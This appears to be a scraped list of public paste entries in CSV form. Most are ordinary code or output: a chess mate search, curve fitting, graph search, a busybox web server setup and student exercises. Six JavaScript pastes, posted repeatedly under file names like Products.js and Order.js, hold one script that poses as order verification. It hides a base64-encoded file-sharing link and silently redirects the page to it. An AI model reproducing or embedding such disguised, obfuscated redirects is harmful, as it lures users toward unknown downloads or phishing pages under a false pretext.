id,title,username,language,date,content
3b6UF2Xj,Untitled,x2LeaF,JavaScript,Monday 14th of April 2025 11:14:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2UzTfwF6,checkmate in 11,max2201111,Python,Monday 14th of April 2025 11:09:21 AM CDT,"Analyzing position: 8/8/8/q7/2k1R3/8/8/3K4 b - - 0 1

Initial position:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . k . R . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Side to move: Black

No checkmate in one move found.
Proceeding with deeper search...
Searching for mate in 1 moves...
Depth 1 completed in 0.0020 seconds
Searching for mate in 2 moves...
Depth 2 completed in 0.0056 seconds
Searching for mate in 3 moves...
Depth 3 completed in 0.0477 seconds
Searching for mate in 4 moves...
Depth 4 completed in 0.1853 seconds
Searching for mate in 5 moves...
Depth 5 completed in 1.5417 seconds
Searching for mate in 6 moves...
Depth 6 completed in 4.9635 seconds
Searching for mate in 7 moves...
Depth 7 completed in 42.0163 seconds
Searching for mate in 8 moves...
Depth 8 completed in 118.7615 seconds
Searching for mate in 9 moves...
Depth 9 completed in 1461.1566 seconds
Searching for mate in 10 moves...
Depth 10 completed in 25845.2522 seconds
Searching for mate in 11 moves...
Depth 11 completed in 58850.2191 seconds
Mate in 11 found!

Checkmate sequence found:
Move 1: Black plays kc4-d3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . . R . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 2: White plays Re4-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . R . . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 3: Black plays kd3-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 4: White plays Kd1-e2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 5: Black plays qa5-f5
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 6: White plays Ke2-d2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 7: Black plays qf5-f2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . q . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 8: White plays Kd2-c1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 9: Black plays kd4-c3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 10: White plays Kc1-b1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . K . . . . . . 1
  a b c d e f g h
Move 11: Black plays qf2-b2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . q . . . . . . 2
1 . K . . . . . . 1
  a b c d e f g h
Checkmate! Black wins.

Total analysis time: 227994.4939 seconds"
meyu0Zzf,Untitled,GregLeblanc,Python,Monday 14th of April 2025 11:05:18 AM CDT,"# Define a generic gaussian function
def gauss_lin(x, *params):
    """"""
    This defines a generic gaussiann function plus a linear background, with 
    an arbitrary number of peaks.  Pass the X values and a pointer to your 
    initial guesses.
    Make sure that guesses are in the order of slope, intercept, amplitude, 
    mean, and sigma, and that you have a multiple of 2+3n guesses to pass in.  
    
    Parameters
    ----------
    x : independent variable
    params : parameters for the Gaussian function
        - slope: slope of the linear background
        - intercept: y-intercept of the linear background
        - amplitude: height of the peak
        - mean: position of the center of the peak
        - sigma: width of the peak
        - (repeat for multiple peaks)
    
    Returns
    -------
    y : dependent variable
    """"""
    y = np.zeros_like(x)
    slope = params[0]
    intercept = params[1]
    y += slope * x + intercept
    for i in range(2, len(params), 3):
        amplitude = params[i]
        mean = params[i + 1]
        sigma = params[i + 2]
        y += amplitude * np.exp(-(( x - mean) ** 2) / (2 * sigma ** 2))
    return y
# End of gauss_lin"
VeEhSyrf,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:59:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27903/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4zdLBFiR,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:55:51 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_time, money;
    node () {}
    node(int _idx, int _shortest_time, int _money) {
        idx = _idx;
        shortest_time = _shortest_time;
        money = _money;
    }
    
    bool operator < (const node & tmp) const {
        if(shortest_time == tmp.shortest_time) {
            return money > tmp.money;
        }
        return shortest_time > tmp.shortest_time;
    }
   
};

int main() {
    return 0;
}
"
GaYj8GbN,Webserver with Loopback interface only,metalx1000,Bash,Monday 14th of April 2025 10:49:48 AM CDT,"mkdir www
cd www

# create index web page and start server
echo ""Hello"" > index.html
busybox httpd -vf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888""

# create httpd webserver config file with restrictions
# busybox will look for httpd.conf in current directory
# or you can tell it to look for it in a set place
echo ""A:127.0.0.1"" > httpd.conf
echo 'D:*' >> httpd.conf
busybox httpd -vfc httpd.conf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888"""
8PrkxmnC,Untitled,GregLeblanc,Python,Monday 14th of April 2025 10:46:57 AM CDT,"
    def fit_peaks(self, type, initial_guesses):
        """"""
        Fit the data to a specified function.
        
        Parameters:
        initial_guesses (tuple): Initial guesses for the fit parameters.
        
        Returns:
        tuple: Fitted parameters and covariance matrix.
        """"""
        parameters = getattr(self, f""{type}_parameters"")
        x = getattr(self, f""{type}_channel"")
        y = getattr(self, f""{type}_counts"")
          
        # Fit the data to the specified function
        popt, pcov = curve_fit(gauss_lin, 
                               x, 
                               y,
                               p0=initial_guesses)
        # print(f""Linear background is: y= {popt[0]:.2f}x + {popt[1]:.2f}"")
        
        parameters = popt

        peak_amplitude = getattr(self, f""{type}_peak_amplitude"")
        peak_mean = getattr(self, f""{type}_peak_mean"")
        peak_sigma = getattr(self, f""{type}_peak_sigma"")

        for i in range(2, len(popt), 3):
            peak_amplitude.append(popt[i])
            peak_mean.append(popt[i + 1])
            peak_sigma.append(popt[i + 2])"
r0rLP0LG,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:43:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fMvh2rUj,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:39:10 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_path;
    node() {}
    node(int _idx, int _shortest_path) {
        idx = _idx;
        shortest_path = _shortest_path;
    }
    
    bool operator < (const node & tmp) const {
        return shortest_path > tmp.shortest_path;
    }
};

int main() {
    int n, V;
    cin >> n >> V;
    
    vector<int> portals(n);
    for(int i = 0; i < n; i++) {
        cin >> portals[i];
    }
    priority_queue<node> pq;
    pq.push(node(0, 0));
    vector<bool> visited(n, false);
    vector<bool> portal_visited(11, false);
    
    while(!pq.empty()) {
        node current_node = pq.top();
        pq.pop();
        
        if(current_node.idx == n - 1) {
            cout << current_node.shortest_path << endl;
            return 0;
        }
        if(visited[current_node.idx]) {
            continue;
        }
        visited[current_node.idx] = true;
        
        if(current_node.idx + 1 < n) {
            pq.push(node(current_node.idx + 1, current_node.shortest_path + 1));
        }
        if(current_node.idx - 1 >= 0) {
            pq.push(node(current_node.idx - 1, current_node.shortest_path + 1));
        }
        
        if(!portal_visited[portals[current_node.idx]]) {
            for(int i = 0; i < n; i++) {
                if(portals[i] == portals[current_node.idx]) {
                    pq.push(node(i, current_node.shortest_path + V));
                }
            }
            portal_visited[portals[current_node.idx]] = true;
        }
    }
    
    return 0;
}
"
ghFepZyk,[NP] Risk,dzocesrce,Java,Monday 14th of April 2025 10:34:19 AM CDT,"import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.List;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

class Round {
    private List<Integer> player1;
    private List<Integer> player2;

    public Round(List<Integer> player1, List<Integer> player2) {
        this.player1 = player1;
        this.player2 = player2;
    }

    public List<Integer> getPlayer1() {
        return player1;
    }

    public List<Integer> getPlayer2() {
        return player2;
    }

    public int player1Victorious(){
        for(int i=0;i<3;i++){
            if(player1.get(i)<=player2.get(i))
                return 0;
        }
        return 1;
    }

    public static Round create(String s) {
        String[] parts= s.split("";"");
        List<Integer> player1= new ArrayList<>();
        String[] player1_dices = parts[0].split(""\\s+"");
        for(int i=0;i<3;i++)
            player1.add(Integer.parseInt(player1_dices[i]));
        List<Integer> player2= new ArrayList<>();
        String[] player2_dices = parts[1].split(""\\s+"");
        for(int i=0;i<3;i++)
            player2.add(Integer.parseInt(player2_dices[i]));

        player1= player1.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        player2= player2.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        return new Round(player1,player2);
    }

}


class Risk {
    private List<Round> rounds;

    public int processAttacksData(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.rounds= bufferedReader.lines().map(i->Round.create(i)).collect(Collectors.toList());

        return rounds.stream().mapToInt(i->i.player1Victorious()).sum();
    }
    
}


public class RiskTester {
    public static void main(String[] args) {

        Risk risk = new Risk();

        System.out.println(risk.processAttacksData(System.in));

    }
}"
xG18FxVn,14-4-25 ordenarVector,Aluneth,C,Monday 14th of April 2025 10:31:21 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void cargarVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        v1[i] = rand() % 10;

    }

}

void imprimirVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        printf(""%d - "", v1[i]);

    }

}

void menor(int v1[10])
{
    int menor = v1[0];
    int seRepite = 0;
    for (int i = 0; i<10-1; i++)
    {

        if (menor == v1[i+1])
        {
            seRepite = 1;
        }

        if (menor>=v1[i+1])
        {
            menor = v1[i+1];
        }
    }
    printf(""El menor es: %d"", menor);
    if (seRepite != 0)
    {
        printf(""\nSe repite el menor"");

    }
}

int main()
{
    srand(time(NULL));
    int vector1[10];
    cargarVector(vector1);
    imprimirVector(vector1);
    menor(vector1);


    // printf(""Hello world!\n"");
    return 0;
}
"
deLxZbY2,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:28:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50023/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mi6kRUFN,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 10:13:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01163/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YqC2znA7,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:57:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43115/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
